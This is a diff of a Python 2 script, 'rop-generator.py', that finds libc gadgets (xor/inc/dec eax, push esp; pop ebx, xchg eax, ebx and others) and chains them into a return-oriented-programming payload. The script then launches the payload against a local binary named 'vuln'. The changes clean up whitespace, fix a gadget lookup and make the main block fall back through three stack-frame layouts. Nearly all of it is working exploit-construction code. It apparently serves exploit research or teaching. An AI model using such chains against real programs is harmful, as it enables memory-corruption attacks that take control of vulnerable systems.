@@ -673,7 +673,6 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
         result = False
     else:
         print 'Found gadget xor  eax, eax; ret in %s library' %(lib_name)
- 
     xor_eax_addr = pack_value(temp)
     ret_addr = xor_eax_addr
     rop_payload += ret_addr
@@ -685,11 +684,9 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
         result = False
     else:
         print 'Found gadget dec  eax; ret in %s library' %(lib_name)
-
     dec_eax_addr = pack_value(temp)
     rop_payload += dec_eax_addr
     #print 'Address of dec eax; ret = 0x%x' %(temp)
-
 
     temp, lib_name = find_gadget_addr(lib_list, find_and_eax_x1000)
     if temp == 0:
@@ -697,11 +694,9 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
         result = False
     else:
         print 'Found gadget and  eax, 0x1000; ret in %s library' %(lib_name)
-    
     and_eax_x1000_addr = pack_value(temp) 
     rop_payload += and_eax_x1000_addr
     #print 'Address of and eax, 0x1000; ret = 0x%x' %(temp)
-
 
     temp, lib_name = find_gadget_addr(lib_list, find_mov_ecx_eax)
     if temp == 0:
@@ -709,14 +704,11 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
         result = False
     else:
         print 'Found gadget mov  ecx, eax; ret in %s library' %(lib_name)
-
     mov_ecx_eax_addr = pack_value(temp)
     rop_payload += mov_ecx_eax_addr
     rop_payload += 4 * pack_value(0x11111111)
     #print 'Address of mov ecx, eax; ret = 0x%x' %(temp)
-
     rop_payload += xor_eax_addr
-
 
     temp, lib_name = find_gadget_addr(lib_list, find_mov_edx_eax)
     if temp == 0:
@@ -724,8 +716,6 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
         result = False
     else:
         print 'Found gadget mov  edx, eax; ret in %s library' %(lib_name)
-
-
     mov_edx_eax_addr = pack_value(temp)
     rop_payload += mov_edx_eax_addr
     rop_payload += 3 * pack_value(0x11111111)
@@ -737,12 +727,10 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
         result = False
     else:
         print 'Found gadget push  esp; pop ebx; ret in %s library' %(lib_name)
-
     push_esp_addr = pack_value(temp)
     rop_payload += push_esp_addr
     rop_payload += pack_value(0x11111111)
     #print 'Address of push esp, pop ebx; ret = 0x%x' %(temp)
-
 
     temp, lib_name = find_gadget_addr(lib_list, find_xchg_eax_ebx)
     if temp == 0:
@@ -750,11 +738,9 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
         result = False
     else:
         print 'Found gadget xchg  eax, ebx; ret in %s library' %(lib_name)
-
     xchg_eax_ebx_addr = pack_value(temp)
     rop_payload += xchg_eax_ebx_addr
     #print 'Address of xchg eax, ebx; ret = 0x%x' %(temp)
-
 
     temp, lib_name = find_gadget_addr(lib_list, find_and_eax_xfffff000)
     if temp == 0:
@@ -762,13 +748,11 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
         result = False
     else:
         print 'Found gadget and  eax, 0xfffff000; ret in %s library' %(lib_name)
-
     and_eax_xff_addr = pack_value(temp)
     rop_payload += and_eax_xff_addr
     rop_payload += pack_value(0x11111111)
     #print 'Address of and eax, 0xfffff000; ret = 0x%x' %(temp)
-
-
+    
     rop_payload += xchg_eax_ebx_addr
 
 
@@ -781,8 +765,7 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
         result = False
     else:
         print 'Found gadget inc  eax; ret in %s library' %(lib_name)
-
-    inc_eax_addr = pack_value(find_gadget_addr(lib_list, find_inc_eax))
+    inc_eax_addr = pack_value(temp)
     rop_payload += 7 * inc_eax_addr
     #print 'Address of inc eax; ret = 0x%x' %(temp)
 
@@ -810,7 +793,6 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
     add_eax_x20_addr = pack_value(temp)
     rop_payload += 4 * (add_eax_x20_addr + 2 * pack_value(0x11111111))
     #print 'Address of add eax, 0x20; ret = 0x%x' %(temp)
-
 
     rop_payload += 3 * dec_eax_addr
 
@@ -1063,17 +1045,12 @@ if __name__ == '__main__':
 
     parser = argparse.ArgumentParser('python rop-generator.py')
     vuln_bin = 'vuln' 
-    parser.add_argument("-lib", type=str, help="Libraries to search for gadgets - default is libc")
+    parser.add_argument("lib", type=str, help="Libraries to search for gadgets - default is libc")
     parser.add_argument("-t", action='store_true', help="Use program as ROP tester") 
     args = parser.parse_args()
     
     lib_list = []
-    libraries = []
-    if args.lib is not None:
-        libraries = args.lib.split(' ')
-    else:
-        libraries.append("/lib/i386-linux-gnu/libc.so.6")
-
+    libraries = args.lib.split(' ')
     compile_binary(libraries)
 
     for entry in libraries:
@@ -1093,23 +1070,35 @@ if __name__ == '__main__':
 
     rop_payload = ""
 
-    if args.lib is None:
-        buffer_address = find_buffer_addr(vuln_bin, 392, if_use_gdb)
-        rop_payload, result = build_rop_chain_libc(lib_list, buffer_address)
-
-    elif (len(libraries) == 1) and (libraries[0].count("libc") == 1):
+    print 'Attempting to find ROP payload with generic stack frame layout ...'
+    buffer_address = find_buffer_addr(vuln_bin, 416, if_use_gdb)
+    rop_payload, result = build_rop_chain_syscall_generic(lib_list, buffer_address + 128)
+    if result == True:
+        print 'Successfully built ROP payload with generic stack frame layout'
+    
+    if result == False:
+        print 'Unable to build ROP payload with generic stack frame layout !'
+        print 'Attempting to find ROP payload with syscall stack frame layout ...'
         buffer_address = find_buffer_addr(vuln_bin, 444, if_use_gdb)
         rop_payload, result = build_rop_chain_libc_syscalls(lib_list, buffer_address + 128)
+        if result == True:
+            print 'Successfully built ROP payload with syscall stack frame layout'
 
-    else:
-        buffer_address = find_buffer_addr(vuln_bin, 416, if_use_gdb)
-        rop_payload, result = build_rop_chain_syscall_generic(lib_list, buffer_address + 128)
+    if result == False:
+        print 'Unable to build ROP payload with syscall stack frame layout !'
+        print 'Attempting to find ROP payload with libc stack frame layout ...'
+        buffer_address = find_buffer_addr(vuln_bin, 392, if_use_gdb)
+        rop_payload, result = build_rop_chain_libc(lib_list, buffer_address)
+        if result == True:
+            print 'Successfully built ROP payload with libc stack frame layout'
+
 
     rm_command = "rm -rf ./vuln2 ./vuln2.c"
     rmproc = subprocess.Popen(rm_command, shell=True, stdout=subprocess.PIPE)
     rmproc.wait()
-    
-    print_rop_payload(rop_payload)
-    
-    subprocess.call(["./vuln", rop_payload])
 
+    if result == True: 
+        print_rop_payload(rop_payload)
+        subprocess.call(["./vuln", rop_payload])
+    else:
+        print 'Unable to build ROP payload with the given set of libraries !'
